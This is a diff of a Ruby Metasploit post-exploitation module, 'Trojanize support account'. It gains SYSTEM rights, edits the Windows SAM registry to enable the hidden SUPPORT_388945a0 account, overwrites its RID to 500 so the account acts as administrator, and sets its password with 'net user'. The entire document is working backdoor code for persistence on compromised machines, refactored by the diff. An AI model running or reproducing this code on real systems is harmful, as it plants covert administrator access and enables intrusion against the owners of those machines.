@@ -2,21 +2,26 @@ require 'msf/core'
 require 'rex'
 
 class Metasploit3 < Msf::Post
+
+	include Msf::Post::Windows::Registry
+	include Msf::Post::Common
+
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Manage - Trojanize support account on servers/workstations',
+				'Name'          => 'Windows Manage - Trojanize support account',
 				'Description'   => %q{
 							This module enables alternative access to servers and workstations
 							by modifying the support account's properties. It will enable
 							the account for remote access as the administrator user while
 							taking advantage of some weird behavior in lusrmgr.msc. It will
 							check if sufficient privileges are available for registry operations,
-							otherwis it exits. More info at: http://xangosec.blogspot.com
+							otherwis it exits.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => 'salcho <salchoman[at]gmail.com>',
 				'Platform'      => [ 'win' ],
-				'SessionTypes'  => [ 'meterpreter' ]
+				'SessionTypes'  => [ 'meterpreter' ],
+				'References'	=> [ 'http://urlhere' ]
 			))
 			register_options(
 			[
@@ -26,73 +31,87 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+		reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'
+
 		if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])
 			res = session.priv.getsystem
-			if !res[0]
+			unless res[0]
 				print_error("You need to run this script as system!")
-				return
-			else
-				print_good("Got system!")
 			end
+
+			print_good("Got system!")
 		end
 
 		sysnfo = session.sys.config.sysinfo
 		print_status("Target OS is #{sysnfo["OS"]}")
-		names_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\SAM\Domains\Account\Users\Names', KEY_READ)
-		if not names_key
+		names_key = registry_enumkeys(reg_key + '\\Names')
+		unless names_key
 			print_error("Couldn't access registry keys")
 			return
 		end
 
 		rid = -1
 		print_status('Harvesting users...')
-		names_key.enum_key.each do |name|
-			if name =~ /SUPPORT_388945a0/
+		names_key.each do |name|
+			if name.include?'SUPPORT_388945a0'
 				print_good("Found #{name} account!")
-				skey = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{name}", KEY_READ)
+				skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
 				if not skey
 					print_error("Couldn't open user's key")
 					return
 				end
-				rid = skey.query_value("").type
+				rid = skey['Type']
 				print_status("Target RID is #{rid}")
-				skey.close
 			end
 		end
-		names_key.close
 
-		if rid != -1
-			users_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\SAM\\Domains\\Account\\Users', KEY_READ)
-			users_key.enum_key.each do |r|
-				next if r == 'Names'
-				if r.to_i(16) == rid
-					u_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{r}", KEY_READ)
-					f = u_key.query_value("F").data
-					if f[0x38].unpack("H*")[0].to_i == 11
-						print_status("Account is disabled, activating...")
-						f[0x38] = ["10"].pack("H")
-					else
-						print_error("Target account is already enabled")
-					end
-
-					print_good("Swapping RIDs...!")
-					f[0x30, 2] = ["f401"].pack(">H*")
-					u_key.close
-
-					open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{r}", KEY_WRITE)
-					open_key.set_value("F", session.sys.registry.type2str("REG_BINARY"), f)
-					open_key.close
-
-					print_good("Setting password to #{datastore['PASSWORD']}")
-					chan = session.sys.process.execute("cmd.exe /c net user support_388945a0 #{datastore['PASSWORD']}", nil, {'Hidden' => true, 'Channelized' => true})
-					while(d = chan.channel.read)
-						print_status("\t#{d}")
-					end
-				end
-			end
-		else
+		if rid == -1
 			print_error("Couldn't get user's RID...")
 			return
 		end
+
+		users_key = registry_enumkeys(reg_key)
+		users_key.each do |r|
+			next if r.to_i(16) != rid
+
+			f = registry_getvaldata(reg_key + "\\#{r}", "F")
+			if check_active(f)
+				print_status("Account is disabled, activating...")
+				f[0x38] = ["10"].pack("H")
+			else
+				print_error("Target account is already enabled")
+			end
+
+			print_good("Swapping RIDs...!")
+			# Overwrite RID to 500 (as administrator)
+			f = swap_rid(f, 500)
+
+			open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
+			unless open_key
+				print_error("Can't write to registry... Something's wrong!")
+				return
+			end
+
+			print_good("Setting password to #{datastore['PASSWORD']}")
+			cmd = cmd_exec('cmd.exe', "/c net user support_388945a0 #{datastore['PASSWORD']}")
+			print_status("#{cmd}")
+		end
 	end
+
+	def check_active(f)
+		if f[0x38].unpack("H*")[0].to_i == 11
+			return true
+		else
+			return false
+		end
+	end
+
+	def swap_rid(f, rid)
+		# This function will set hex format to a given RID integer
+		hex = [("%04x" % rid).scan(/.{2}/).reverse.join].pack("H*")
+		# Overwrite new RID at offset 0x30
+		f[0x30, 2] = hex
+		return f
+	end
+		
 end
